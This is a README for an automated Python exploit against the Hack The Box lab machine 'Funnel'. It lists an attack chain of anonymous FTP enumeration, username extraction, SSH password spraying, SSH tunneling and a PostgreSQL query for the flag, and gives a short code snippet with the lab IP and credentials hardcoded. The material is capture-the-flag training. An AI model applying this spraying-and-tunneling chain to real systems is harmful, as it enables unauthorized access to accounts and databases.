# Funnel Exploit - HTB

## Description

This is an **automated Python exploit** for the Hack The Box machine **"Funnel"**.  
It performs:
- **FTP Enumeration & File Extraction**
- **Username Extraction from Emails**
- **SSH Password Spraying**
- **Port Forwarding via SSH Tunneling**
- **PostgreSQL Exploitation & Flag Extraction**

---

## **Usage**

### 1️⃣ Install Dependencies

Ensure you have the required packages installed:

```bash
pip install paramiko psycopg2 nmap
```

### 2️⃣ Run the Exploit

```bash
python3 funnel_exploit.py
```

---

## **Exploit Details**

1. **Enumerates FTP (Anonymous Access)**
2. **Extracts Usernames & Default Password**
3. **Attempts SSH Login via Password Spraying**
4. **Sets Up SSH Tunnel to Access PostgreSQL**
5. **Queries PostgreSQL for Flag**

---

## **PoC Code Snippet**

```python
import paramiko
import psycopg2
import ftplib
import subprocess

TARGET_IP = "10.129.228.195"
USERNAME = "christine"
PASSWORD = "funnel123#!#"
LOCAL_PORT = 1234
REMOTE_PORT = 5432

def ssh_tunnel():
    subprocess.Popen(f"ssh -L {LOCAL_PORT}:localhost:{REMOTE_PORT} {USERNAME}@{TARGET_IP}", shell=True)

def fetch_flag():
    conn = psycopg2.connect(dbname="secrets", user=USERNAME, password=PASSWORD, host="127.0.0.1", port=LOCAL_PORT)
    cur = conn.cursor()
    cur.execute("SELECT * FROM flag;")
    print("[FLAG]:", cur.fetchone()[0])
    conn.close()
```

---

## **Legal Disclaimer**

> This tool is for **educational purposes only**.  
> Unauthorized use against live systems is strictly prohibited.

---
